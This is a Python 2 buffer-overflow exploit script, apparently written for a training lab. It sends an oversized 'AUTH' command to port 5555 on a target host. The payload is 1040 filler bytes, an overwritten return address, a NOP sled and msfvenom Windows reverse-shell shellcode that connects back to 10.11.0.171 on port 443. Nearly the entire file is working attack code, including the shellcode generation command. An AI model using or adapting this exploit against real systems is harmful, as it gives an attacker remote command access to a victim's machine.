#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.171 LPORT=443 -f py -b '\x00\x0a\x0d\x20'
buf = ""
buf += "\xba\xc5\xa0\x0e\x98\xda\xd7\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x31\x57\x12\x03\x57\x12\x83\x02\xa4\xec"
buf += "\x6d\x70\x4d\x72\x8d\x88\x8e\x13\x07\x6d\xbf\x13\x73"
buf += "\xe6\x90\xa3\xf7\xaa\x1c\x4f\x55\x5e\x96\x3d\x72\x51"
buf += "\x1f\x8b\xa4\x5c\xa0\xa0\x95\xff\x22\xbb\xc9\xdf\x1b"
buf += "\x74\x1c\x1e\x5b\x69\xed\x72\x34\xe5\x40\x62\x31\xb3"
buf += "\x58\x09\x09\x55\xd9\xee\xda\x54\xc8\xa1\x51\x0f\xca"
buf += "\x40\xb5\x3b\x43\x5a\xda\x06\x1d\xd1\x28\xfc\x9c\x33"
buf += "\x61\xfd\x33\x7a\x4d\x0c\x4d\xbb\x6a\xef\x38\xb5\x88"
buf += "\x92\x3a\x02\xf2\x48\xce\x90\x54\x1a\x68\x7c\x64\xcf"
buf += "\xef\xf7\x6a\xa4\x64\x5f\x6f\x3b\xa8\xd4\x8b\xb0\x4f"
buf += "\x3a\x1a\x82\x6b\x9e\x46\x50\x15\x87\x22\x37\x2a\xd7"
buf += "\x8c\xe8\x8e\x9c\x21\xfc\xa2\xff\x2d\x31\x8f\xff\xad"
buf += "\x5d\x98\x8c\x9f\xc2\x32\x1a\xac\x8b\x9c\xdd\xd3\xa1"
buf += "\x59\x71\x2a\x4a\x9a\x58\xe9\x1e\xca\xf2\xd8\x1e\x81"
buf += "\x02\xe4\xca\x06\x52\x4a\xa5\xe6\x02\x2a\x15\x8f\x48"
buf += "\xa5\x4a\xaf\x73\x6f\xe3\x5a\x8e\xf8\x06\x90\x90\x53"
buf += "\x7e\xa4\x90\xa2\xc4\x21\x76\xce\x2a\x64\x21\x67\xd2"
buf += "\x2d\xb9\x16\x1b\xf8\xc4\x19\x97\x0f\x39\xd7\x50\x65"
buf += "\x29\x80\x90\x30\x13\x07\xae\xee\x3b\xcb\x3d\x75\xbb"
buf += "\x82\x5d\x22\xec\xc3\x90\x3b\x78\xfe\x8b\x95\x9e\x03"
buf += "\x4d\xdd\x1a\xd8\xae\xe0\xa3\xad\x8b\xc6\xb3\x6b\x13"
buf += "\x43\xe7\x23\x42\x1d\x51\x82\x3c\xef\x0b\x5c\x92\xb9"
buf += "\xdb\x19\xd8\x79\x9d\x25\x35\x0c\x41\x97\xe0\x49\x7e"
buf += "\x18\x65\x5e\x07\x44\x15\xa1\xd2\xcc\x25\xe8\x7e\x64"
buf += "\xae\xb5\xeb\x34\xb3\x45\xc6\x7b\xca\xc5\xe2\x03\x29"
buf += "\xd5\x87\x06\x75\x51\x74\x7b\xe6\x34\x7a\x28\x07\x1d"

#FAIL: AUTH <SHELLCODE> <DUMMYTEXT> <EIP> <BACKWARD JMP TO SHELLCODE>
#PASS: AUTH <DUMMYTEXT> <EIP> <16x NOP> <shellcode>
req1 = "AUTH " + "\x41"*(1040) + "\x71\x1D\xD1\x65" + "\x90"*16 + buf
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()